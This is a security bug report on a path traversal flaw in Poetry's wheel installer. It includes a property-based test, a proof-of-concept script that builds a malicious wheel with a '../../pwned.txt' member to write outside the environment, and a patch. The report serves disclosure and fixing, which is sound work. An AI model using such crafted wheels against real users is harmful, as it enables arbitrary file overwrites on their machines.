# Bug Report: poetry.installation.wheel_installer Path traversal lets wheel files be written outside the environment

**Target**: `poetry.installation.wheel_installer.WheelDestination.write_to_fs` / `WheelInstaller.install`
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-05

## Summary

`WheelDestination.write_to_fs` joins the archive member path directly onto the scheme directory (`Path(self.scheme_dict[scheme]) / path`) and never checks that the result stays inside it. A wheel containing a member such as `../../pwned.txt` is written outside the target environment, so installing a malicious wheel can write arbitrary files anywhere the user can write. Poetry's override also drops the base class's "file already exists" check, so existing files get overwritten too (a warning is logged, but the write still happens).

## Property-Based Test

```python
segment = st.one_of(st.just(".."), st.text(alphabet="abcxyz_", min_size=1, max_size=5))
rel_paths = st.lists(segment, min_size=1, max_size=6).filter(lambda p: p[-1] != "..").map("/".join)

@settings(max_examples=300)
@given(scheme=st.sampled_from(["purelib", "platlib", "data"]), path=rel_paths, data=st.binary(max_size=64))
def test_write_to_fs_stays_within_scheme(scheme, path, data):
    with tempfile.TemporaryDirectory() as td:
        root = Path(td).resolve()
        dest = make_dest(root)
        scheme_root = Path(dest.scheme_dict[scheme]).resolve()
        try:
            entry = dest.write_to_fs(scheme, path, io.BytesIO(data), False)
        except (ValueError, OSError):
            return
        written = (scheme_root / path).resolve()
        assert written.is_relative_to(scheme_root), f"wrote outside scheme dir: {written}"
```

**Failing input**: `scheme='purelib', path='../_'` (end-to-end test: wheel member `../../a.txt`)

## Reproducing the Bug

```python
import tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

class Env:
    def __init__(self, root):
        self.scheme_dict = {k: str(root / "env" / k) for k in ["purelib", "platlib", "scripts", "data", "include"]}
        self.python = Path("/usr/bin/python3")

root = Path(tempfile.mkdtemp()).resolve()
whl = root / "evil-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    z.writestr("../../pwned.txt", b"pwned")
    z.writestr("evil-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n")
    z.writestr("evil-1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nGenerator: x\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
    z.writestr("evil-1.0.dist-info/RECORD", "")

WheelInstaller(Env(root)).install(whl)
print((root / "pwned.txt").read_bytes())  # b'pwned' -- written outside env/
```

## Why This Is A Bug

The `write_to_fs` contract inherited from `installer` says `path` is a "path within that scheme". Installing a wheel should only write files under the environment's scheme directories. Here, untrusted archive member names containing `..` (or absolute paths) escape the environment, which allows arbitrary file writes and overwrites. For example, a package from a malicious or compromised index could overwrite `~/.bashrc`. The bundled `installer` 0.7.0 does not reject these paths either, so Poetry's own destination class is the last place this could be caught, and it isn't.

## Fix

```diff
--- a/src/poetry/installation/wheel_installer.py
+++ b/src/poetry/installation/wheel_installer.py
@@ class WheelDestination(SchemeDictionaryDestination):
-        target_path = Path(self.scheme_dict[scheme]) / path
+        scheme_root = Path(self.scheme_dict[scheme]).resolve()
+        target_path = (scheme_root / path).resolve()
+        if not target_path.is_relative_to(scheme_root):
+            raise ValueError(
+                f"Attempting to write {path} outside of the target directory"
+            )
         if target_path.exists():
```
